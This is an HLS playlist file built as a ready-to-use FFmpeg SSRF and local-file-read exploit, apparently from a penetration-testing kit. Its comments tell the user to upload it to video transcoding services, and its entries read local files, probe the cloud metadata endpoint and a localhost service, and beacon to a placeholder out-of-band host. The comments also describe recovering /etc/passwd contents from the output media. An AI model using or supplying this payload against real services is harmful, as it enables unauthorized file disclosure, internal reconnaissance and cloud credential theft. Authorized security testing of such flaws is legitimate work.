# Safe PoC -> x8bitranjit
#EXT-X-VERSION:3
# ============================================================================
# FFmpeg HLS file-read / SSRF PoC - x8bitranjit lab style. Authorized testing only.
#
# WHAT THIS DEMONSTRATES: FFmpeg (and HLS-aware transcoding services) resolve
# the URIs listed in an .m3u8 playlist - including file:// and internal http://.
# Feed this playlist to any "upload video/audio for transcoding" feature and
# the server reads the referenced sources into the output artifact.
#
# WHERE TO USE: video/audio upload+transcode features, media processors,
# anything accepting "playlist" uploads (m3u8/m3u/concat).
#
# WHAT TO EDIT:
#   - Replace  YOUR-OOB-HOST.example.invalid  with your listener to prove the
#     fetch (OOB callback from the transcode worker).
#   - The file:/// entries below are READ-ONLY demos of what gets read; if the
#     output media is downloadable, the read content is recoverable from the
#     artifact (extract frames/audio, strings).
#   - The metadata URL proves internal reach from the worker tier.
#
# CONFIRMATION: transcode completes (or errors referencing the file) + OOB hit
# from the worker IP + downloaded artifact contains /etc/passwd content frames.
# KIT CROSS-REF: SSRF-047 (ffmpeg HLS), UPL-016, CMDI-025.
# ============================================================================

# read a local file into the transcode output (benign: /etc/hostname)
file:///etc/hostname
# internal reachability probes (worker tier position)
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:8080/actuator/health
# OOB beacon (edit host)
http://ffmpeg-ssrf.YOUR-OOB-HOST.example.invalid/beacon
